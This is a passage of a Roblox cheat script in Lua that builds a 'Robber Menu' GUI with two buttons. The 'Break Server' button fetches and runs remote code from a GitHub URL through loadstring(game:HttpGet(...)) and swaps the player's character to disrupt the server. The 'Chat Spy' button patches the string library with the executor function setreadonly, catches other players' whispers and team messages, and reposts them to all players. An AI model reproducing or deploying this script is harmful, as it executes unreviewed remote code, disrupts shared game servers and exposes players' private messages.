RobberMenu.BreakServer.Name = "Break Server"
RobberMenu.BreakServer.Parent = RobberMenu._2ndFrame
RobberMenu.BreakServer.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
RobberMenu.BreakServer.BorderSizePixel = 0
RobberMenu.BreakServer.Position = UDim2.new(0.377358496, 0, 0.228666648, 0)
RobberMenu.BreakServer.Size = UDim2.new(0, 117, 0, 32)
RobberMenu.BreakServer.Font = Enum.Font.SourceSans
RobberMenu.BreakServer.Text = "Break Server"
RobberMenu.BreakServer.TextColor3 = Color3.fromRGB(0, 0, 0)
RobberMenu.BreakServer.TextSize = 14.000
RobberMenu.BreakServer.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/mrgunz/S/main/List"))();
	warn("Breaking The Server.") 
	game.StarterGui:SetCore("SendNotification", 
		{Title = "Robber Menu";
			Text = "Breaking Server.";
			Duration = 3;})
	wait()
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local char = Instance.new("Model", workspace)
	LocalPlayer.Character:ClearAllChildren()
	char.Name = "character"
	Instance.new("Part", char).Name = "Torso";
	Instance.new("Part", char).Name = "Head";
	Instance.new("Humanoid", char).Name = "Humanoid";
	LocalPlayer.Character = char
	wait()
	warn("Done.") 
	game.StarterGui:SetCore("SendNotification", 
		{Title = "Robber Menu";
			Text = "Done.";
			Duration = 3;})
end)

RobberMenu.ChatSpy.Name = "Chat Spy"
RobberMenu.ChatSpy.Parent = RobberMenu._2ndFrame
RobberMenu.ChatSpy.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
RobberMenu.ChatSpy.BorderSizePixel = 0
RobberMenu.ChatSpy.Position = UDim2.new(0.0503144674, 0, 0.228666648, 0)
RobberMenu.ChatSpy.Size = UDim2.new(0, 117, 0, 32)
RobberMenu.ChatSpy.Font = Enum.Font.SourceSans
RobberMenu.ChatSpy.Text = "Chat Spy (Buggy)"
RobberMenu.ChatSpy.TextColor3 = Color3.fromRGB(0, 0, 0)
RobberMenu.ChatSpy.TextSize = 14.000
RobberMenu.ChatSpy.MouseButton1Down:connect(function()
	print("Starting.")
	local players = game:GetService("Players");
	local repStorage = game:GetService("ReplicatedStorage");

	setreadonly(string, false)
	string.startswith = function(self, stuff)
		local found = self:find("^" .. stuff) ~= nil;

		return found;
	end;

	local say = function(...)
		repStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(..., "All");
	end;

	for _, v in next, players:GetPlayers() do
		v.Chatted:Connect(function(msg)
			if msg:startswith("/t") then
				say("Spy BOT");
				say("[" .. v.Name .. "]: " .. msg);
			end;
		end);
	end;

	local players = game:GetService("Players");
	local repStorage = game:GetService("ReplicatedStorage");

	setreadonly(string, false)
	string.startswith = function(self, stuff)
		local found = self:find("^" .. stuff) ~= nil;

		return found;
	end;

	local say = function(...)
		repStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(..., "All");
	end;

	for _, v in next, players:GetPlayers() do
		v.Chatted:Connect(function(msg)
			if msg:startswith("/w") then
				say("Spy BOT");
				say("[" .. v.Name .. "]: " .. msg);
			end;
		end);
	end;

	local players = game:GetService("Players");
	local repStorage = game:GetService("ReplicatedStorage");

	setreadonly(string, false)
	string.startswith = function(self, stuff)
		local found = self:find("^" .. stuff) ~= nil;

		return found;
	end;

	local say = function(...)
		repStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(..., "All");
	end;

	for _, v in next, players:GetPlayers() do
		v.Chatted:Connect(function(msg)
			if msg:startswith("/me") then
				say("Spy BOT");
				say("[" .. v.Name .. "]: " .. msg);
			end;
		end);
	end;
	print("Made By MrgunzYT")
	print("Done.")
end)

